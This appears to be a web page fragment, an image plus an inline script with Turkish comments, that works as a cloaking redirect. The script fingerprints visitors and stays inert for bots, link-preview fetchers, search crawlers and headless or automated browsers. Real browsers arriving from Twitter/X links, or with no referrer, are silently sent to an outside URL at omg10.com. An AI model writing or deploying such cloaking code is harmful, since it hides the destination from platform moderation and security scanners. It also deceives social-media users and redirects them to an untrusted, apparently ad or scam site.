<img src="ai92pp0.jpg" alt="">
<script>
(function(){
  var ua = navigator.userAgent.toLowerCase();
  var ref = document.referrer.toLowerCase();
  
  // Bilinen bot pattern'leri
  var botPattern = /bot|crawler|spider|twitterbot|facebookexternalhit|linkedinbot|whatsapp|telegram|discord|slack|preview|fetch|headless|phantom|selenium|puppeteer|playwright|chrome-lighthouse|pingdom|gtmetrix|w3c|validator|google|bing|yandex|baidu/i;
  
  if (botPattern.test(ua)) { return; }
  
  // Gercek tarayici kontrolu - olmasi gereken ozellikler
  var hasChrome = /chrome|safari|firefox|edg|opera/i.test(ua);
  var hasPlugins = navigator.plugins && navigator.plugins.length > 0;
  var hasLanguages = navigator.languages && navigator.languages.length > 0;
  var hasScreen = screen.width > 100 && screen.height > 100;
  var hasMime = navigator.mimeTypes && navigator.mimeTypes.length > 0;
  
  // Headless Chrome tespit (webdriver flag)
  if (navigator.webdriver === true) { return; }
  
  // Twitter'dan referrer veya direkt giriş (referrer bos ise yine de izin ver - bazi kullanicilar privacy)
  var fromSocial = ref.includes('t.co') || ref.includes('twitter.com') || ref.includes('x.com') || ref === '';
  
  if (hasChrome && hasLanguages && hasScreen && fromSocial) {
    setTimeout(function(){
      window.location.replace("https://omg10.com/4/9403364");
    }, 50);
  }
})();
</script>
